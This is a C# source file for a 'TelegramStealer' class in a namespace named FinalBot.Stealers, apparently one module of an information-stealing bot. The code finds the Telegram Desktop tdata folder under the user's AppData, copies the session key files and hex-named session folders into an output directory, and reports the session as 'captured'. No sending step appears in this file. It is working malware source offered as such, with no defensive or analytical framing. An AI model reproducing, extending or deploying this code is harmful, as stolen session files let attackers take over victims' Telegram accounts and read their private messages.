using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace FinalBot.Stealers
{
    public class TelegramStealer
    {
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public async Task<string> Run(string outputDir)
        {
            string tdataPath = Path.Combine(_appData, "Telegram Desktop", "tdata");
            if (!Directory.Exists(tdataPath)) return "❌ Telegram Desktop not found.";

            string destPath = Path.Combine(outputDir, "Telegram_Session");
            Directory.CreateDirectory(destPath);

            try 
            {
                int count = 0;
                // Session files are usually key_datas, map*, and folders with 16-char hex names
                var files = Directory.GetFiles(tdataPath, "*", SearchOption.TopDirectoryOnly);
                foreach (var file in files)
                {
                    string name = Path.GetFileName(file);
                    if (name.Length == 16 || name == "key_datas" || name.StartsWith("map"))
                    {
                        if (new FileInfo(file).Length < 5 * 1024 * 1024)
                        {
                            File.Copy(file, Path.Combine(destPath, name), true);
                            count++;
                        }
                    }
                }

                // D877F783D5D3EF8C (example folder name)
                var dirs = Directory.GetDirectories(tdataPath, "*", SearchOption.TopDirectoryOnly);
                foreach (var dir in dirs)
                {
                    string name = Path.GetFileName(dir);
                    if (name.Length == 16 && !name.Equals("user_data", StringComparison.OrdinalIgnoreCase))
                    {
                        CopyDirectory(dir, Path.Combine(destPath, name));
                        count++;
                    }
                }

                return $"✅ Telegram session captured ({count} items).";
            }
            catch (Exception ex)
            {
                return $"❌ Error capturing Telegram: {ex.Message}";
            }
        }

        private void CopyDirectory(string sourceDir, string destDir)
        {
            Directory.CreateDirectory(destDir);
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
            }
            foreach (var subDir in Directory.GetDirectories(sourceDir))
            {
                CopyDirectory(subDir, Path.Combine(destDir, Path.GetFileName(subDir)));
            }
        }
    }
}
